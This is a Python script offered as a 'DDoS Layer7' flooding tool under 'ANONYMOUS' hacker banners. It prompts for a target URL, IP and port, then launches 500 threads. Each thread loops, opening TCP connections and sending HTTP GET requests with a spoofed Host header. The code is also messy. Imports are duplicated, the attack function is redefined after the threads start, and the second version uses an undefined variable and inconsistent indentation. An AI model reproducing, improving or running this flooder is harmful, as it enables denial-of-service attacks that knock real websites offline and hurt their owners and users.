import random, socket, threading
from concurrent.futures import ThreadPoolExecutor
from random import choice, randint
from socket import socket, AF_INET, SOCK_STREAM, error
from time import sleep
import socket, threading
from threading import Thread
import random
import time
import os, sys
import threading
import requests
from socket import socket,AF_INET , SOCK_DGRAM,SOCK_STREAM,gaierror
from random import _urandom
from os import system
from sys import exit
from colorama import *
from time import sleep
import socket

#########Terminal colors################
red = "\033[1;31m"
blue = "\033[1;34m"
green = "\033[1;32m"
yellow = "\033[1;33m"
white = "\033[1;37m"
default = "\033[0m"

time.sleep(1)
os.system("clear")

os.system("figlet DDoS HTTP")
time.sleep(3)

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(0.045)

type("""DDos NEW METHOD""")
time.sleep(3)
os.system("clear")

print("""
             __      ANONYMOUS       _____
            / /  __ _ _   _  ___ _  |___  |
           / /  / _` | | | |/ _ \ '__| / /
          / /__| (_| | |_| |  __/ |   / /
          \____/\__,_|\__, |\___|_|  /_/
                      |___/
                 ADDED NEW METHOD 
               DDoS Layer7 (DDoS) 💥
""")
print()
#########################################################################
# IMPORT MODULE
import os, sys, socket, threading, random
#########################################################################
# CLEAR
def clear():
	os.system('cls' if os.name=='nt' else 'clear')
#########################################################################

#########Terminal colors################
red = "\033[1;31m"
blue = "\033[1;34m"
green = "\033[1;32m"
yellow = "\033[1;33m"
white = "\033[1;37m"
default = "\033[0m"

#########################################################################
#ip
url = input("\033[94m╔═══\033[91m[ Url ] •\n\033[94m╠══>\033[0m ")
url_chek =requests.get(url)
ip = socket.gethostbyname(url.replace("https://","").replace("http://",""))
print(ip)

# MAIN MENU 
print()
target = str(input("\033[94m╔═══\033[91m[ IP ] •\n\033[94m╠══>\033[0m "))
port = int(input("\033[94m╠═══\033[91m[ PORT ] •\n\033[94m╠══>\033[0m "))
clear()
print("\033[94m")
#########################################################################

fake_ip = '77.109.33.232'

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
    attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        global attack_num
        attack_num += 1
        print (f"{green}Sent{red} {send}{green} packet{blue} {ip}{green} port {yellow}{port}{default}")
	print(attack_num)
        s.close()
#print('Atacando porta 💥')
